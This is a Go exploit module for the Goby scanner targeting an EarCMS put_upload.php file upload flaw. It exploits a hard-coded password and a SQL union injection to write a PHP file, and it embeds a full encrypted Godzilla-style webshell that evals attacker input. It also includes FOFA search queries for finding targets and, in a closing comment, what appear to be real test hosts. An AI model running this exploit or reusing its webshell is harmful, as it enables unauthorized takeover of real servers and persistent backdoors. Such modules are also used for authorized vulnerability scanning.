package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "math/rand"
    "strings"
    "time"
)

func init() {
    expJson := `{
    "Name": "earcms put_upload.php file upload vulnerability",
    "Description": "<p>Earcms is a platform for distributing software.</p><p>Earcms foreground put_ upload. In PHP, there is a problem of PW parameter hard coding. At the same time, the SQL statement PDO is used incorrectly, and the SQL statement is not effectively filtered. The file name and suffix can be controlled, resulting in arbitrary file upload.</p>",
    "Product": "Earcms",
    "Homepage": "http://www.idaxian.com/",
    "DisclosureDate": "2022-07-16",
    "Author": "hututuZH",
    "FofaQuery": "body=\"earcms\" || body=\"/static/index/propeller.svg\" || body=\"/static/index/plane.svg\" || body=\"/images/propeller.svg\"",
    "GobyQuery": "body=\"earcms\" || body=\"/static/index/propeller.svg\" || body=\"/static/index/plane.svg\" || body=\"/images/propeller.svg\"",
    "Level": "3",
    "Impact": "<p>Earcms foreground put_ upload. In PHP, there is a problem of PW parameter hard coding. At the same time, the SQL statement PDO is used incorrectly, and the SQL statement is not effectively filtered. The file name and suffix can be controlled, resulting in arbitrary file upload.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.idaxian.com/\">http://www.idaxian.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpshell",
            "type": "input",
            "value": "<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n$data=file_get_contents(\"php://input\");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n\t\teval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (stripos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "earcms put_upload.php 硬编码任意文件上传漏洞",
            "Product": "Earcms",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">EarCMS用于分发软件的平台。</span><br></p><p>EarCMS前台put_upload.php中，存在pw参数硬编码问题，同时sql语句pdo使用错误，没有有效过滤sql语句，可以控制文件名和后缀，导致可以任意文件上传。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.idaxian.com/\">http://www.idaxian.com/</a><br></p>",
            "Impact": "<p>EarCMS前台put_upload.php中，存在pw参数硬编码问题，同时sql语句pdo使用错误，没有有效过滤sql语句，可以控制文件名和后缀，导致可以任意文件上传。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "earcms put_upload.php file upload vulnerability",
            "Product": "Earcms",
            "Description": "<p>Earcms is a platform for distributing software.</p><p>Earcms foreground put_ upload. In PHP, there is a problem of PW parameter hard coding. At the same time, the SQL statement PDO is used incorrectly, and the SQL statement is not effectively filtered. The file name and suffix can be controlled, resulting in arbitrary file upload.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.idaxian.com/\">http://www.idaxian.com/</a><br></p>",
            "Impact": "<p>Earcms foreground put_ upload. In PHP, there is a problem of PW parameter hard coding. At the same time, the SQL statement PDO is used incorrectly, and the SQL statement is not effectively filtered. The file name and suffix can be controlled, resulting in arbitrary file upload.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            uri := "/source/index/put_upload.php"
            cfg := httpclient.NewPostRequestConfig(uri)
            cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
            cfg.Header.Store("Content-Type", "multipart/form-data;boundary=---------------------------141225804626496209592978386925")
            cfg.VerifyTls = false
            random := rand.New(rand.NewSource(time.Now().UnixNano()))
            randomName := fmt.Sprintf("%06v", random.Int31n(1000000))
            cfg.Data = "-----------------------------141225804626496209592978386925\nContent-Disposition: form-data; name=\"ipa\"; filename=\"" + randomName + "\"\nContent-Type: application/x-msdownload\n\n<?php\necho(md5(88));\n$file = __FILE__;\nif (file_exists($file)) {\n     @unlink ($file);\n}\n\n\n-----------------------------141225804626496209592978386925\nContent-Disposition: form-data; name=\"id\"\n\n-1  union SELECT \"" + randomName + ".php\";\n-----------------------------141225804626496209592978386925\nContent-Disposition: form-data; name=\"pw\"\n\nmonth-cf3b79c6e54ca7a8d50cdc8aedcde407\n-----------------------------141225804626496209592978386925--"
            if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
                uri = "/data/attachment/" + randomName + ".php"
                if resp2, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
                    return resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, "2a38a4a9316c49e5a833517c45d31070")
                }
                return false
            }
            return false
        },
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            uri := "/source/index/put_upload.php"
            cfg := httpclient.NewPostRequestConfig(uri)
            cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
            cfg.Header.Store("Content-Type", "multipart/form-data;boundary=---------------------------141225804626496209592978386925")
            cfg.VerifyTls = false
            random := rand.New(rand.NewSource(time.Now().UnixNano()))
            randomName := fmt.Sprintf("%06v", random.Int31n(1000000))
            phpshell := ss.Params["phpshell"].(string)
            cfg.Data = "-----------------------------141225804626496209592978386925\nContent-Disposition: form-data; name=\"ipa\"; filename=\"" + randomName + "\"\nContent-Type: application/x-msdownload\n\n" + phpshell + "\n-----------------------------141225804626496209592978386925\nContent-Disposition: form-data; name=\"id\"\n\n-1  union SELECT \"" + randomName + ".php\";\n-----------------------------141225804626496209592978386925\nContent-Disposition: form-data; name=\"pw\"\n\nmonth-cf3b79c6e54ca7a8d50cdc8aedcde407\n-----------------------------141225804626496209592978386925--"
            if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
                if resp.StatusCode == 200 {
                    uri = "/data/attachment/" + randomName + ".php"
                    expResult.Output = expResult.HostInfo.FixedHostInfo + uri + "\nGodzilla to connect the webshell,Encryptor:PHP_XOR_RAW\npassword:pass \nkey:key"
                    expResult.Success = true
                }
            }
            return expResult
        },
    ))
}

//测试ip
//https://u7yx.com/
//https://103.122.92.160/
